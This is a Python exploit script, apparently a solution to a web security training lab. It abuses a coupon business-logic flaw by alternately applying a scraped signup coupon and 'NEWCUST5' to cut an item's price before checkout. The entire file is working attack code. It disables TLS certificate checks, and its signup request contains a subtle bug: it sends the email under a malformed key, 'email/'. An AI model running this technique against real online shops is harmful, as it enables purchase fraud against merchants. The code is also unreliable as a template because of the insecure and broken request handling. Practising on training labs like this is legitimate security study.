import re
import sys
import urllib3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from utils import get_csrf_token, login

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

POPUP_RE = re.compile(r'Use coupon\s+([A-Z0-9_-]{3,40})\s+at checkout!?', re.I)

def extract_coupon(html: str) -> str | None:
    text = BeautifulSoup(html, "html.parser").get_text(" ", strip=True)
    m = POPUP_RE.search(text)
    if m:
        return m.group(1)

    m = POPUP_RE.search(html)
    if m:
        return m.group(1)
    return None

def get_signup_coupon(session: requests.Session, url: str) -> str:
    url = url.rstrip("/")
    home = session.get(f"{url}/", verify=False)
    home.raise_for_status()
    soup = BeautifulSoup(home.text, "html.parser")
    form = soup.find("form", attrs={"action": "/sign-up"})
    if not form:
        raise RuntimeError("Couldn't find the /sign-up form on the homepage.")

    csrf_inp = form.find("input", attrs={"name": "csrf"})
    if not csrf_inp or not csrf_inp.get("value"):
        raise RuntimeError("Couldn't find CSRF token in /sign-up form.")

    email_inp = form.find("input", attrs={"type": "email"})
    if not email_inp or not email_inp.get("name"):
        raise RuntimeError("Couldn't find email input name in /sign-up form.")

    csrf_token = csrf_inp["value"]

    signup_url = urljoin(url , "/sign-up")
    r = session.post(
        signup_url,
        data={"csrf": csrf_token, "email/": "test@example.com"},
        verify=False,
        allow_redirects=True
    )
    r.raise_for_status()

    coupon = extract_coupon(r.text)
    if not coupon:
        confirm = session.get(f"{url}/?sign-up-confirmed=true", verify=False)
        confirm.raise_for_status()
        coupon = extract_coupon(confirm.text)

    if not coupon:
        raise RuntimeError("Could not extract signup coupon from popup message.")
    return coupon

def buy_item(session: requests.Session, url: str):
    url = url.rstrip("/")

    # 1) Login
    print("(+) Trying to logging as wiener")
    login_url = f"{url}/login"
    login(session, login_url, "wiener", "peter")
    print("(+) Logged-in")

    # 2) Add item to cart
    print('(+) Adding "Lightweight l33t leather jacket" to the cart')
    cart_url = f"{url}/cart"
    r = session.post(cart_url, data={"productId": "1", "redir": "PRODUCT", "quantity": "1"}, verify=False)
    r.raise_for_status()

    # 3) Get signup coupon
    print("(+) Trying to get signup coupon")
    signup_coupon = get_signup_coupon(session, url)
    print(f"(+) Coupon: {signup_coupon}")

    # 4) Apply coupons alternating
    coupon_url = f"{url}/cart/coupon"
    for i in range(9):
        csrf_token = get_csrf_token(session, cart_url)
        code = "NEWCUST5" if (i % 2) else signup_coupon
        r = session.post(coupon_url, data={"csrf": csrf_token, "coupon": code}, verify=False)
        r.raise_for_status()

    # 5) Checkout
    checkout_url = f"{url}/cart/checkout"
    csrf_token = get_csrf_token(session, cart_url)
    data_checkout = {"csrf": csrf_token}
    response = session.post(checkout_url, data=data_checkout, verify=False)

    # 5) Check solved condition
    if "Congratulations" in response.text:
        print("(+) Successfully exploited the business logic vulnerability.")
    else:
        print("(-) Could not exploit the business logic vulnerability.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    session = requests.Session()
    buy_item(session, sys.argv[1])

if __name__ == "__main__":
    main()
